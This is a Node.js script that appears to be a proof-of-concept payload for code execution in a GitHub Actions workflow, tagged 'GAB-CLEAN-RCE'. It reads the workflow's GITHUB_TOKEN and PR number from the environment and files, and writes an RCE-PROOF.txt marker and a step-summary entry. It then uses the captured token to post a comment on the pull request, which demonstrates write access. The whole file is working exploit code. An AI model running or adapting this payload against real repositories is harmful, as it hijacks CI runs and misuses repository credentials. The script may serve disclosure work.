const fs = require('fs');
const path = require('path');
const ws = process.env.GITHUB_WORKSPACE || process.cwd();
const token = process.env.GITHUB_TOKEN || '';
const repo = process.env.GITHUB_REPOSITORY || '';
const cands = [process.env.PR_NUMBER_PATH, path.join(ws, 'pr-number.txt'), path.join(process.cwd(), '..', 'pr-number.txt'), path.join(process.cwd(), '..', '..', 'pr-number.txt')].filter(Boolean);
let pr = '';
for (const c of cands) { try { const v = fs.readFileSync(c, 'utf8').trim(); if (v) { pr = v; break; } } catch (e) {} }
const info = 'GAB-CLEAN-RCE wf=' + process.env.GITHUB_WORKFLOW + ' event=' + process.env.GITHUB_EVENT_NAME + ' run=' + process.env.GITHUB_RUN_ID + ' pr=' + pr + ' token_len=' + token.length + ' cwd=' + process.cwd();
try { fs.writeFileSync(path.join(ws, 'RCE-PROOF.txt'), info); } catch (e) {}
if (process.env.GITHUB_STEP_SUMMARY) { try { fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY, '\n' + info + '\n'); } catch (e) {} }
(async () => {
  if (!pr) return;
  const r = await fetch('https://api.github.com/repos/' + repo + '/issues/' + pr + '/comments', {
    method: 'POST',
    headers: { authorization: 'Bearer ' + token, accept: 'application/vnd.github+json', 'content-type': 'application/json' },
    body: JSON.stringify({ body: info })
  });
  console.log('COMMENT-STATUS ' + r.status);
})().catch(e => console.error('ERR ' + e.message));
